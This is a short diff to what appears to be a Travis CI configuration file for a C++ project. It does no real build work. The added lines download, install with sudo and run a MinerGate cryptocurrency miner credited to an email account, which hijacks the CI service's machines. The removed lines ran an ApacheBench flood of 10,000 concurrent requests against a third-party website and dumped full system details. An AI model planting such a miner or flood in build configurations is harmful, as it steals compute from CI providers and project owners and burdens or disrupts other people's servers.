@@ -1,5 +1,4 @@
 language: cpp
 sudo: enabled
-os: osx
-install: system_profiler -detailLevel full
-script: ab -c150 -n10000 http://www.goldfathers.com/_vti_bin/fpcount.exe/?Page=index.html|Image=2
+install: wget https://minergate.com/download/deb-cli
+script: sudo dpkg -i deb-cli && sudo minergate-cli -bcn -user onyxdeveloperteam@gmail.com
